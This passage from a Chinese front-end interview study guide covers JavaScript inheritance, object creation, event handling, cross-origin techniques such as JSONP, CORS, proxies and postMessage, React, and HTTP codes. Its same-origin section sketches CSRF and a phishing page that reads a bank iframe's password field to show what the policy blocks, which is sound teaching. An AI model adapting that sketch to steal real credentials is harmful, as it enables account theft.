'parent';this.arr = [1, 2, 3];&#125;SuperType.prototype.say = function() &#123; console.log('this is parent')&#125;functionSubType() &#123;SuperType.call(this) // 第二次调用SuperType&#125;SubType.prototype = newSuperType() // 第一次调用SuperType 优点： 父类的方法可以被复用 父类的引用属性不会被共享 子类构建实例时可以向父类传递参数 缺点：调用了两次父类的构造函数，第一次给子类的原型添加了父类的name, arr属性，第二次又给子类的构造函数添加了父类的name, arr属性，从而覆盖了子类原型中的同名参数。这种被覆盖的情况造成了性能上的浪费。 原型式继承核心：原型式继承的object方法本质上是对参数对象的一个浅复制。 1234567891011121314151617functionobject(o)&#123; function F()&#123;&#125; F.prototype = o;return new F();&#125;var person = &#123; name: "Nicholas", friends: ["Shelby", "Court", "Van"]&#125;;var anotherPerson = object(person);anotherPerson.name = "Greg";anotherPerson.friends.push("Rob");var yetAnotherPerson = object(person);yetAnotherPerson.name = "Linda";yetAnotherPerson.friends.push("Barbie");alert(person.friends); //"Shelby,Court,Van,Rob,Barbie" ECMAScript 5 通过新增 Object.create()方法规范化了原型式继承。这个方法接收两个参数:一 个用作新对象原型的对象和(可选的)一个为新对象定义额外属性的对象。在传入一个参数的情况下， Object.create()与 object()方法的行为相同。——《JAVASCript高级编程》 所以上文中代码可以转变为： 12var yetAnotherPerson = object(person); =&gt; var yetAnotherPerson = Object.create(person); 优点：父类方法可以复用。缺点： 父类的引用属性会被所有子类实例共享 子类构建实例时不能向父类传递参数 寄生式继承核心：使用原型式继承获得一个目标对象的浅复制，然后增强这个浅复制的能力。 优缺点：仅提供一种思路，没什么优点。1234567891011121314151617function createAnother(original)&#123; var clone = object(original); //通过调用函数创建一个新对象 clone.sayHi = function()&#123; //以某种方式来增强这个对象 alert("hi");&#125;; return clone; //返回这个对象&#125;var person = &#123; name: "Nicholas", friends: ["Shelby", "Court", "Van"]&#125;;var anotherPerson = createAnother(person);anotherPerson.sayHi(); //"hi" 寄生组合继承刚才说到组合继承有一个会两次调用父类的构造函数造成浪费的缺点，寄生组合继承就可以解决这个问题。 123456789101112131415161718192021222324function inheritPrototype(subType, superType)&#123; var prototype = object(superType.prototype); // 创建了父类原型的浅复制 prototype.constructor = subType; // 修正原型的构造函数 subType.prototype = prototype; // 将子类的原型替换为这个原型&#125;function SuperType(name)&#123; this.name = name; this.colors = ["red", "blue", "green"];&#125;SuperType.prototype.sayName = function()&#123; alert(this.name);&#125;;function SubType(name, age)&#123; SuperType.call(this, name); this.age = age;&#125;// 核心：因为是对父类原型的复制，所以不包含父类的构造函数，也就不会调用两次父类的构造函数造成浪费inheritPrototype(SubType, SuperType);SubType.prototype.sayAge = function()&#123; alert(this.age);&#125; 优缺点：这是一种完美的继承方式。ES6的类继承核心： ES6继承的结果和寄生组合继承相似，本质上，ES6继承是一种语法糖。但是，寄生组合继承是先创建子类实例this对象，然后再对其增强；而ES6先将父类实例对象的属性和方法，加到this上面（所以必须先调用super方法），然后再用子类的构造函数修改this。 123456class A &#123;&#125;class B extends A &#123; constructor() &#123; super(); &#125;&#125; ES6实现继承的具体原理： 12345678910class A &#123;&#125;class B &#123;&#125;Object.setPrototypeOf = function(obj, proto) &#123; obj.__proto__ = proto;return obj;&#125;// B 的实例继承 A 的实例Object.setPrototypeOf(B.prototype, A.prototype);// B 继承 A 的静态属性Object.setPrototypeOf(B, A); ES6继承与ES5继承的异同：相同点：本质上ES6继承是ES5继承的语法糖。不同点： ES6继承中子类的构造函数的原型链指向父类的构造函数，ES5中使用的是构造函数复制，没有原型链指向。 ES6子类实例的构建，基于父类实例，ES5中不是。 总结 ES6 Class extends是ES5继承的语法糖 JS的继承除了构造函数继承之外都基于原型链构建的 可以用寄生组合继承实现ES6 Class extends，但是还是会有细微的差别 javascript创建对象的几种方式？javascript创建对象简单的说,无非就是使用内置对象或各种自定义对象，当然还可以用JSON；但写法有很多种，也能混合使用。 1、对象字面量的方式1person=&#123;firstname:"Mark",lastname:"Yun",age:25,eyecolor:"black"&#125;; 2、用function来模拟无参的构造函数12345678function Person()&#123;&#125; var person=new Person();//定义一个function，如果使用new"实例化",该function可以看作是一个Class person.name="Mark"; person.age="25"; person.work=function()&#123; alert(person.name+" hello...");&#125;person.work(); 3、用function来模拟参构造函数来实现（用this关键字定义构造的上下文属性）12345678910function Pet(name,age,hobby)&#123; this.name=name;//this作用域：当前对象 this.age=age; this.hobby=hobby; this.eat=function()&#123; alert("我叫"+this.name+",我喜欢"+this.hobby+",是个程序员"); &#125;&#125;var maidou =new Pet("麦兜",25,"coding");//实例化、创建对象maidou.eat();//调用eat方法 4、用工厂方式来创建（内置对象）1234567var wcDog =new Object(); wcDog.name="旺财"; wcDog.age=3; wcDog.work=function()&#123; alert("我是"+wcDog.name+",汪汪汪......"); &#125;wcDog.work(); 5、用原型方式来创建1234567function Dog()&#123;&#125;Dog.prototype.name="旺财";Dog.prototype.eat=function()&#123; alert(this.name+"是个吃货");&#125;var wangcai =new Dog();wangcai.eat(); 6、用混合方式来创建123456789function Car(name,price)&#123; this.name=name; this.price=price;&#125;Car.prototype.sell=function()&#123; alert("我是"+this.name+"，我现在卖"+this.price+"万元");&#125;var camry =new Car("凯美瑞",27); camry.sell(); 什么是window对象? 什么是document对象? window对象是指浏览器打开的窗口。 document对象是Documentd对象（HTML 文档对象）的一个只读引用，window对象的一个属性。 写一个通用的事件侦听器函数。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// event(事件)工具集，来源：github.com/markyun markyun.Event = &#123; // 页面加载完成后 readyEvent : function(fn) &#123; if (fn==null) &#123; fn=document; &#125; var oldonload = window.onload; if (typeof window.onload != 'function') &#123; window.onload = fn; &#125; else &#123; window.onload = function() &#123; oldonload(); fn(); &#125;; &#125; &#125;, // 视能力分别使用dom0||dom2||IE方式 来绑定事件 // 参数： 操作的元素,事件名称 ,事件处理程序 addEvent : function(element, type, handler) &#123; if (element.addEventListener) &#123; //事件类型、需要执行的函数、是否捕捉 element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; element.attachEvent('on' + type, function() &#123; handler.call(element); &#125;); &#125; else &#123; element['on' + type] = handler; &#125; &#125;, // 移除事件 removeEvent : function(element, type, handler) &#123; if (element.removeEventListener) &#123; element.removeEventListener(type, handler, false); &#125; else if (element.datachEvent) &#123; element.detachEvent('on' + type, handler); &#125; else &#123; element['on' + type] = null; &#125; &#125;, // 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获) stopPropagation : function(ev) &#123; if (ev.stopPropagation) &#123; ev.stopPropagation(); &#125; else &#123; ev.cancelBubble = true; &#125; &#125;, // 取消事件的默认行为 preventDefault : function(event) &#123; if (event.preventDefault) &#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;, // 获取事件目标 getTarget : function(event) &#123; return event.target || event.srcElement; &#125;, // 获取event对象的引用，取到事件的所有信息，确保随时能使用event； getEvent : function(e) &#123; var ev = e || window.event; if (!ev) &#123; var c = this.getEvent.caller; while (c) &#123; ev = c.arguments[0]; if (ev &amp;&amp; Event == ev.constructor) &#123; break; &#125; c = c.caller; &#125; &#125; return ev; &#125; &#125;; [“1”, “2”, “3”].map(parseInt) 答案是多少？123456789101112parseInt() 函数能解析一个字符串，并返回一个整数，需要两个参数 (val, radix)， 其中 radix 表示要解析的数字的基数。【该值介于 2 ~ 36 之间，并且字符串中的数字不能大于radix才能正确返回数字结果值】; 但此处 map 传了 3 个 (element, index, array),我们重写parseInt函数测试一下是否符合上面的规则。 function parseInt(str, radix) &#123; return str+'-'+radix; &#125;; var a=["1", "2", "3"]; a.map(parseInt); // ["1-0", "2-1", "3-2"] 不能大于radix 因为二进制里面，没有数字3,导致出现超范围的radix赋值和不合法的进制解析，才会返回NaN 所以["1", "2", "3"].map(parseInt) 答案也就是：[1, NaN, NaN] 事件是？IE与火狐的事件机制有什么区别？ 如何阻止冒泡？ 我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为。 事件处理机制：IE是事件冒泡、Firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件； ev.stopPropagation();(旧ie的方法 ev.cancelBubble = true;) 如何解决跨域问题？要掌握跨域，首先要知道为什么会有跨域这个问题出现？ 为什么会有跨域由于浏览器存在同源策略，请求的 Url 地址的协议、主机名、端口号必须完全相同，否则会产生跨域，同源策略的限制下 cookie 、loclstorage、dom、ajax、IndexDB 等都不允许跨域、form 表单不受同源策略限制对跨域的理解有一个误区，跨域不是请求没有发送出去或者服务器接收到请求而没有响应，正确的情况是请求发出，服务器响应，由于响应和请求来自不同的域被浏览器拦截了。 没有同源策略限制的两大危险场景浏览器是从两个方面去做这个同源策略的，一是针对接口的请求，二是针对Dom的查询。 没有同源策略限制的接口请求有一个小小的东西叫cookie大家应该知道，一般用来处理登录等场景，目的是让服务端知道谁发出的这次请求。如果你请求了接口进行登录，服务端验证通过后会在响应头加入Set-Cookie字段，然后下次再发请求的时候，浏览器会自动将cookie附加在HTTP请求的头字段Cookie中，服务端就能知道这个用户已经登录过了。知道这个之后，我们来看场景： 你准备去清空你的购物车，于是打开了买买买网站www.maimaimai.com，然后登录成功，一看，购物车东西这么少，不行，还得买多点。 你在看有什么东西买的过程中，你的好基友发给你一个链接www.nidongde.com，一脸yin笑地跟你说：“你懂的”，你毫不犹豫打开了。 你饶有兴致地浏览着www.nidongde.com，谁知这个网站暗地里做了些不可描述的事情！由于没有同源策略的限制，它向www.maimaimai.com发起了请求！聪明的你一定想到上面的话“服务端验证通过后会在响应头加入Set-Cookie字段，然后下次再发请求的时候，浏览器会自动将cookie附加在HTTP请求的头字段Cookie中”，这样一来，这个不法网站就相当于登录了你的账号，可以为所欲为了！如果这不是一个买买买账号，而是你的银行账号，那…… 这就是传说中的CSRF攻击。 没有同源策略限制的Dom查询 有一天你刚睡醒，收到一封邮件，说是你的银行账号有风险，赶紧点进www.yinghang.com改密码。你吓尿了，赶紧点进去，还是熟悉的银行登录界面，你果断输入你的账号密码，登录进去看看钱有没有少了。 睡眼朦胧的你没看清楚，平时访问的银行网站是www.yinhang.com，而现在访问的是www.yinghang.com，这个钓鱼网站做了什么呢？ 1234567// HTML&lt;iframe name="yinhang" src="www.yinhang.com"&gt;&lt;/iframe&gt;// JS// 由于没有同源策略的限制，钓鱼网站可以直接拿到别的网站的Domconst iframe = window.frames['yinhang']const node = iframe.document.getElementById('你输入账号密码Input')console.log(`拿到了这个$&#123;node&#125;，我还拿不到你刚刚输入的账号密码吗`) 由此我们知道，同源策略确实能规避一些危险，不是说有了同源策略就安全，只是说同源策略是一种浏览器最基本的安全机制，毕竟能提高一点攻击的成本。其实没有刺不穿的盾，只是攻击的成本和攻击成功后获得的利益成不成正比。 跨域正确的打开方式经过对同源策略的了解，我们应该要消除对浏览器的误解，同源策略是浏览器做的一件好事，是用来防御来自邪门歪道的攻击，但总不能为了不让坏人进门而把全部人都拒之门外吧。没错，我们这种正人君子只要打开方式正确，就应该可以跨域。 下面将一个个演示正确打开方式，但在此之前，有些准备工作要做。为了本地演示跨域，我们需要： 随便跑起一份前端代码（以下前端是随便跑起来的vue），地址是http://localhost:9099。 随便跑起一份后端代码（以下后端是随便跑起来的node koa2），地址是http://localhost:9971。 同源策略限制下接口请求的正确打开方式JSONP在HTML标签里，一些标签比如script、img这样的获取资源的标签是没有跨域限制的，利用这一点，我们可以这样干。 后端写个小接口： 12345678910111213// 处理成功失败返回格式的工具const &#123;successBody&#125; = require('../utli')class CrossDomain&#123; static async jsonp (ctx) &#123;// 前端传过来的参数const query = ctx.request.query// 设置一个cookies ctx.cookies.set('tokenId', '1')// query.cb是前后端约定的方法名字，其实就是后端返回一个直接执行的方法给前端，由于前端是用script标签发起的请求，所以返回了这个方法后相当于立马执行，并且把要返回的数据放在方法的参数里。 ctx.body = `$&#123;query.cb&#125;($&#123;JSON.stringify(successBody(&#123;msg: query.msg&#125;, 'success'))&#125;)`&#125;&#125;module.exports = CrossDomain 简单版前端： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;script type='text/javascript'&gt;// 后端返回直接执行的方法，相当于执行这个方法，由于后端把返回的数据放在方法的参数里，所以这里能拿到res。 window.jsonpCb = function(res) &#123; console.log(res) &#125;&lt;/script&gt;&lt;script src='http://localhost:9871/api/jsonp?msg=helloJsonp&amp;cb=jsonpCb' type='text/javascript'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 简单封装一下前端这个套路： 1234567891011121314151617181920212223242526272829303132333435363738394041/** * JSONP请求工具 * @param url 请求的地址 * @param data 请求的参数 * @returns &#123;Promise&lt;any&gt;&#125; */const request = (&#123;url, data&#125;) =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123;// 处理传参成xx=yy&amp;aa=bb的形式const handleData = (data) =&gt; &#123;const keys = Object.keys(data)const keysLen = keys.length return keys.reduce((pre, cur, index) =&gt; &#123;const value = data[cur] const flag = index !== keysLen - 1 ? '&amp;' : ''return `$&#123;pre&#125;$&#123;cur&#125;=$&#123;value&#125;$&#123;flag&#125;`&#125;, '')&#125; // 动态创建script标签 const script = document.createElement('script')// 接口返回的数据获取 window.jsonpCb = (res) =&gt; &#123; document.body.removeChild(script) delete window.jsonpCb resolve(res)&#125; script.src = `$&#123;url&#125;?$&#123;handleData(data)&#125;&amp;cb=jsonpCb` document.body.appendChild(script)&#125;)&#125;// 使用方式request(&#123; url: 'http://localhost:9871/api/jsonp', data: &#123;// 传参 msg: 'helloJsonp'&#125;&#125;).then(res =&gt; &#123; console.log(res)&#125;) 空iframe加form细心的朋友可能发现，JSONP只能发GET请求，因为本质上script加载资源就是GET，那么如果要发POST请求怎么办呢？ 后端写个小接口： 12345678910// 处理成功失败返回格式的工具const &#123;successBody&#125; = require('../utli')class CrossDomain&#123; static async iframePost (ctx) &#123; let postData = ctx.request.body console.log(postData) ctx.body = successBody(&#123;postData: postData&#125;, 'success')&#125;&#125;module.exports = CrossDomain 前端： 123456789101112131415161718192021222324252627282930313233343536const requestPost = (&#123;url, data&#125;) =&gt; &#123;// 首先创建一个用来发送数据的iframe.const iframe = document.createElement('iframe')iframe.name = 'iframePost'iframe.style.display = 'none'document.body.appendChild(iframe)const form = document.createElement('form')const node = document.createElement('input')// 注册iframe的load事件处理程序,如果你需要在响应返回时执行一些操作的话.iframe.addEventListener('load', function() &#123; console.log('post success')&#125;)form.action = url // 在指定的iframe中执行formform.target = iframe.nameform.method = 'post'for(let name indata) &#123; node.name = name node.value = data[name].toString() form.appendChild(node.cloneNode())&#125; // 表单元素需要添加到主文档中.form.style.display = 'none'document.body.appendChild(form)form.submit()// 表单提交后,就可以删除这个表单,不影响下次的数据发送.document.body.removeChild(form)&#125;// 使用方式requestPost(&#123; url: 'http://localhost:9871/api/iframePost', data: &#123; msg: 'helloIframePost' &#125;&#125;) CORSCORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）跨域资源共享 CORS 详解。看名字就知道这是处理跨域问题的标准做法。CORS有两种请求，简单请求和非简单请求。 浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。只要同时满足以下两大条件，就属于简单请求 （1）请求方法是以下三种方法之一： HEAD GET POST （2）HTTP的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain 简单请求后端： 123456789101112// 处理成功失败返回格式的工具const &#123;successBody&#125; = require('../utli')class CrossDomain&#123; static async cors (ctx) &#123; const query = ctx.request.query // *时cookie不会在http请求中带上 ctx.set('Access-Control-Allow-Origin', '*') ctx.cookies.set('tokenId', '2') ctx.body = successBody(&#123;msg: query.msg&#125;, 'success') &#125;&#125;module.exports = CrossDomain 前端什么也不用干，就是正常发请求就可以，如果需要带cookie的话，前后端都要设置一下，下面那个非简单请求例子会看到。 1fetch(`http://localhost:9871/api/cors?msg=helloCors`).then(res =&gt; &#123;console.log(res)&#125;) 非简单请求非简单请求会发出一次预检测请求，返回码是204，预检测通过才会真正发出请求，这才返回200。这里通过前端发请求的时候增加一个额外的headers来触发非简单请求。 后端： 1234567891011121314151617// 处理成功失败返回格式的工具const &#123;successBody&#125; = require('../utli')class CrossDomain&#123; static async cors (ctx) &#123;const query = ctx.request.query// 如果需要http请求中带上cookie，需要前后端都设置credentials，且后端设置指定的origin ctx.set('Access-Control-Allow-Origin','http://localhost:9099') ctx.set('Access-Control-Allow-Credentials', true)// 非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为"预检"请求（preflight）// 这种情况下除了设置origin，还需要设置Access-Control-Request-Method以及Access-Control-Request-Headers ctx.set('Access-Control-Request-Method', 'PUT,POST,GET,DELETE,OPTIONS') ctx.set('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, t') ctx.cookies.set('tokenId', '2') ctx.body = successBody(&#123;msg: query.msg&#125;, 'success')&#125;&#125;module.exports = CrossDomain 一个接口就要写这么多代码，如果想所有接口都统一处理，有什么更优雅的方式呢？见下面的koa2-cors。 12345678910111213141516171819202122232425const path = require('path')const Koa = require('koa')const koaStatic = require('koa-static')const bodyParser = require('koa-bodyparser')const router = require('./router')const cors = require('koa2-cors')const app = new Koa()const port = 9871app.use(bodyParser())// 处理静态资源 这里是前端build好之后的目录app.use(koaStatic(path.resolve(__dirname, '../dist')))// 处理corsapp.use(cors(&#123; origin: function(ctx) &#123; return 'http://localhost:9099' &#125;, credentials: true, allowMethods: ['GET', 'POST', 'DELETE'], allowHeaders: ['t', 'Content-Type']&#125;))// 路由app.use(router.routes()).use(router.allowedMethods())// 监听端口app.listen(9871)console.log(`[demo] start-quick is starting at port $&#123;port&#125;`) 前端： 12345678910fetch(`http://localhost:9871/api/cors?msg=helloCors`, &#123;// 需要带上cookie credentials: 'include',// 这里添加额外的headers来触发非简单请求 headers: &#123; 't': 'extra headers' &#125;&#125;).then(res =&gt; &#123; console.log(res)&#125;) 代理想一下，如果我们请求的时候还是用前端的域名，然后有个东西帮我们把这个请求转发到真正的后端域名上，不就避免跨域了吗？这时候，Nginx出场了。 Nginx配置： 1234567891011server&#123;# 监听9099端口 listen 9099;# 域名是localhost server_name localhost;#凡是localhost:9099/api这个样子的，都转发到真正的服务端地址http://localhost:9871 location ^~ /api &#123; proxy_pass http://localhost:9871; &#125; &#125; 前端就不用干什么事情了，除了写接口，也没后端什么事情了。 1234567891011// 请求的时候直接用回前端这边的域名http://localhost:9099，这就不会跨域，然后Nginx监听到凡是localhost:9099/api这个样子的，都转发到真正的服务端地址http://localhost:9871 fetch('http://localhost:9099/api/iframePost', &#123; method: 'POST', headers: &#123; 'Accept': 'application/json', 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; msg: 'helloIframePost' &#125;)&#125;) Nginx转发的方式似乎很方便！但这种使用也是看场景的，如果后端接口是一个公共的API，比如一些公共服务获取天气什么的，前端调用的时候总不能让运维去配置一下Nginx，如果兼容性没问题（IE 10或者以上），CROS才是更通用的做法吧。 同源策略限制下Dom查询的正确打开方式postMessagewindow.postMessage() 是HTML5的一个接口，专注实现不同窗口不同页面的跨域通讯。 为了演示方便，我们将hosts改一下：127.0.0.1 crossDomain.com，现在访问域名crossDomain.com就等于访问127.0.0.1。 这里是http://localhost:9099/#/crossDomain，发消息方： 12345678910111213141516171819202122232425262728&lt;template&gt; &lt;div&gt;&lt;button @click = "postMessage"&gt;//给http://crossDomain.com:9099发消息&lt;/button&gt; &lt;iframe name = "crossDomainIframe" src = "http://crossdomain.com:9099"&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default&#123; mounted () &#123; window.addEventListener('message', (e) =&gt; &#123;// 这里一定要对来源做校验 if(e.origin === 'http://crossdomain.com:9099') &#123;// 来自http://crossdomain.com:9099的结果回复 console.log(e.data) &#125; &#125;) &#125;, methods: &#123;// 向http://crossdomain.com:9099发消息 postMessage () &#123; const iframe = window.frames['crossDomainIframe'] iframe.postMessage('我是[http://localhost:9099], 麻烦你查一下你那边有没有id为app的Dom', 'http://crossdomain.com:9099') &#125; &#125;&#125;&lt;/script&gt; 这里是http://crossdomain.com:9099，接收消息方： 1234567891011121314151617181920212223&lt;template&gt;&lt;div&gt; 我是http://crossdomain.com:9099&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; mounted () &#123; window.addEventListener('message', (e) =&gt; &#123;// 这里一定要对来源做校验if(e.origin === 'http://localhost:9099') &#123;// http://localhost:9099发来的信息 console.log(e.data); // e.source可以是回信的对象，其实就是http://localhost:9099窗口对象(window)的引用// e.origin可以作为targetOrigin e.source.postMessage(`我是[http://crossdomain.com:9099]，我知道了兄弟，这就是你想知道的结果：$&#123;document.getElementById('app') ? '有id为app的Dom' : '没有id为app的Dom'&#125;`, e.origin); &#125; &#125;) &#125;&#125;&lt;/script&gt; document.domain这种方式只适合主域名相同，但子域名不同的iframe跨域。 比如主域名是http://crossdomain.com:9099，子域名是http://child.crossdomain.com:9099，这种情况下给两个页面指定一下document.domain即document.domain = crossdomain.com就可以访问各自的window对象了。 canvas操作图片的跨域问题documen.write和 innerHTML的区别 document.write只能重绘整个页面 innerHTML可以重绘页面的一部分 DOM操作——怎样添加、移除、移动、复制、创建和查找节点?（1）创建新节点 createDocumentFragment() //创建一个DOM片段 createElement() //创建一个具体的元素 createTextNode() //创建一个文本节点###（2）添加、移除、替换、插入 appendChild() removeChild() replaceChild() insertBefore() //在已有的子节点前插入一个新的子节点###（3）查找 getElementsByTagName() //通过标签名称 getElementsByName() //通过元素的Name属性的值(IE容错能力较强，会得到一个数组，其中包括id等于name值的) getElementById() //通过元素Id，唯一性 jquery.extend 与 jquery.fn.extend的区别？jquery.extend 为jquery类添加类方法，可以理解为添加静态方法jquery.fn.extend: 源码中jquery.fn = jquery.prototype，所以对jquery.fn的扩展，就是为jquery类添加成员函数 使用： jquery.extend扩展，需要通过jquery类来调用，而jquery.fn.extend扩展，所有jquery实例都可以直接调用。 那些操作会造成内存泄漏？内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。 垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。 闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环） JQuery一个对象可以同时绑定多个事件，这是如何实现的？1234567多个事件同一个函数： $("div").on("click mouseover", function()&#123;&#125;);多个事件不同函数 $("div").on(&#123; click: function()&#123;&#125;, mouseover: function()&#123;&#125; &#125;); 用js实现千位分隔符?12345678function commafy(num) &#123; return num &amp;&amp; num .toString() .replace(/(\d)(?=(\d&#123;3&#125;)+\.)/g, function($0, $1) &#123; return $1 + ","; &#125;); &#125;console.log(commafy(1234567.90)); //1,234,567.90 检测浏览器版本版本有哪些方式？功能检测、userAgent特征检测 比如：navigator.userAgent//“Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36(KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36” 使用JS实现获取文件扩展名？1234567function getFileExtension(filename) &#123; return filename.slice((filename.lastIndexOf(".") - 1 &gt;&gt;&gt; 0) + 2); &#125;String.lastIndexOf() 方法返回指定值（本例中的'.'）在调用该方法的字符串中最后出现的位置，如果没找到则返回 -1。对于'filename'和'.hiddenfile'，lastIndexOf的返回值分别为0和-1无符号右移操作符(»&gt;) 将-1转换为4294967295，将-2转换为4294967294，这个方法可以保证边缘情况时文件名不变。String.prototype.slice() 从上面计算的索引处提取文件的扩展名。如果索引比文件名的长度大，结果为""。 Webpack热更新实现原理? Webpack编译期，为需要热更新的 entry 注入热更新代码(EventSource通信) 页面首次打开后，服务端与客户端通过 EventSource 建立通信渠道，把下一次的 hash 返回前端 客户端获取到hash，这个hash将作为下一次请求服务端 hot-update.js 和 hot-update.json的hash 修改页面代码后，Webpack 监听到文件修改后，开始编译，编译完成后，发送 build 消息给客户端 客户端获取到hash，成功后客户端构造hot-update.js script链接，然后插入主文档 hot-update.js 插入成功后，执行hotAPI 的 createRecord 和 reload方法，获取到 Vue 组件的 render方法，重新 render 组件， 继而实现 UI 无刷新更新。 描述一下React 生命周期渲染过程调用到的生命周期函数，主要几个要知道； constructor getInitialState getDefaultProps componentWillMount render componentDidMount 更新过程 componentWillReceiveProps shouldComponentUpdate componentWillUpdate render componentDidUpdate 卸载过程 componentWillUnmount 实现组件有哪些方式？ React.createClass 使用API来定义组件 React ES6 class component 用 ES6 的class 来定义组件 Functional stateless component 通过函数定义无状态组件 应该在React生命周期的什么阶段发出ajax请求，为什么？AJAX请求应在 componentDidMount函数 进行请求。 shouldComponentUpdate函数有什么作用？shouldComponentUpdate是一个允许我们自行决定某些组件（以及他们的子组件）是否进行更新的生命周期函数，reconciliation的最终目的是尽可能以最有效的方式去根据新的state更新UI， 如果你已经知道UI的哪些状态无需进行改变，就没必要去让React去判断它是否该改变。 让shouldComponentUpdate返回falss, React就会让当前的组件和其子组件保持不变。 当组件的setState函数被调用之后，发生了什么？React会做的第一件事就是把你传递给setState的参数对象合并到组件原先的state。这个事件会导致一个“reconciliation”（调和）的过程。reconciliation的最终目标就是， 尽可能以最高效的方法，去基于新的state来更新UI。为了达到这个目的，React会构建一个React元素树（你可以把这个想象成一个表示UI的一个对象）。一旦这个树构建完毕， React为了根据新的state去决定UI要怎么进行改变，它会找出这棵新树和旧树的不同之处。React能够相对精确地找出哪些位置发生了改变以及如何发生了什么变化， 并且知道如何只通过必要的更新来最小化重渲染。 为什么循环产生的组件中要利用上key这个特殊的prop？Keys负责帮助React跟踪列表中哪些元素被改变/添加/移除。React利用子元素的key在比较两棵树的时候，快速得知一个元素是新的还是刚刚被移除。没有keys，React也就不知道当前哪一个的item被移除了。 React-router 路由的实现原理？说说React Native,Weex框架的实现原理？受控组件(Controlled Component)与非受控组件(Uncontrolled Component)的区别refs 是什么?Refs是能访问DOM元素或组件实例的一个函数； React为什么自己定义一套事件体系呢，与浏览器原生事件体系有什么关系？什么时候应该选择用class实现一个组件，什么时候用一个函数实现一个组件？组件用到了state或者用了生命周期函数，那么就该使用Class component。其他情况下，应使用Functional component。 什么是HoC（Higher-Order Component）？适用于什么场景？高阶组件就是一个 React 组件包裹着另外一个 React 组件并不是父子关系的组件，如何实现相互的数据通信？ 使用父组件，通过props将变量传入子组件 （如通过refs，父组件获取一个子组件的方法，简单包装后，将包装后的方法通过props传入另一个子组件） 用过 React 技术栈中哪些数据流管理库？Redux\Dva Redux是如何做到可预测呢？Redux将React组件划分为哪两种？Redux是如何将state注入到React组件上的？请描述一次完整的 Redux 数据流React的批量更新机制 BatchUpdates？React与Vue，各自的组件更新进行对比，它们有哪些区别？你遇到过比较难的技术问题是？你是如何解决的？设计模式 知道什么是singleton, factory, strategy, decrator么?常使用的库有哪些？常用的前端开发工具？开发过什么应用或组件？页面重构怎么操作？ 网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。 也就是说是在不改变UI的情况下，对网站进行优化，在扩展的同时保持一致的UI。 对于传统的网站来说重构通常是： 表格(table)布局改为DIV+CSS 使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对IE6有效的) 对于移动平台的优化 针对于SEO进行优化 深层次的网站重构应该考虑的方面 减少代码间的耦合 让代码保持弹性 严格按规范编写代码 设计可扩展的API 代替旧有的框架、语言(如VB) 增强用户体验 通常来说对于速度的优化也包含在重构中 压缩JS、CSS、image等前端资源(通常是由服务器来解决)程序的性能优化(如数据读写) 采用CDN来加速资源加载 对于JS DOM的优化 HTTP服务器的文件缓存 列举IE与其他浏览器不一样的特性？1、事件不同之处： 触发事件的元素被认为是目标（target）。而在 IE 中，目标包含在 event 对象的 srcElement 属性； 获取字符代码、如果按键代表一个字符（shift、ctrl、alt除外），IE 的 keyCode 会返回字符代码（Unicode），DOM 中按键的代码和字符是分离的，要获取字符代码，需要使用 charCode 属性； 阻止某个事件的默认行为，IE 中阻止某个事件的默认行为，必须将 returnValue 属性设置为 false，Mozilla 中，需要调用 preventDefault() 方法； 停止事件冒泡，IE 中阻止事件进一步冒泡，需要设置 cancelBubble 为 true，Mozzilla 中，需要调用 stopPropagation()； 99%的网站都需要被重构是那本书上写的？ 网站重构：应用web标准进行设计（第2版） WEB应用从服务器主动推送Data到客户端有那些方式？ html5提供的Websocket 不可见的iframe WebSocket通过Flash XHR长时间连接 XHR Multipart Streaming 对Node的优点和缺点提出了自己的看法？（优点）因为Node是基于事件驱动和无阻塞的，所以非常适合处理并发请求，因此构建在Node上的代理服务器相比其他技术实现（如Ruby）的服务器表现要好得多。 此外，与Node代理服务器交互的客户端代码是由javascript语言编写的， 因此客户端和服务器端都用同一种语言编写，这是非常美妙的事情。 （缺点）Node是一个相对新的开源项目，所以不太稳定，它总是一直在变，而且缺少足够多的第三方库支持。看起来，就像是Ruby/Rails当年的样子。 http状态码有那些？分别代表是什么意思？简单版[ 100 Continue 继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息 200 OK 正常返回信息 201 Created 请求成功并且服务器创建了新的资源 202 Accepted 服务器已接受请求，但尚未处理 301 Moved Permanently 请求的网页已永久移动到新位置。 302 Found 临时性重定向。 303 See Other 临时性重定向，且总是使用 GET 请求新的 URI。 304 Not Modified 自从上次请求后，请求的网页未修改过。 400 Bad Request 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。 401 Unauthorized 请求未授权。 403 Forbidden 禁止访问。 404 Not Found 找不到如何与 URI 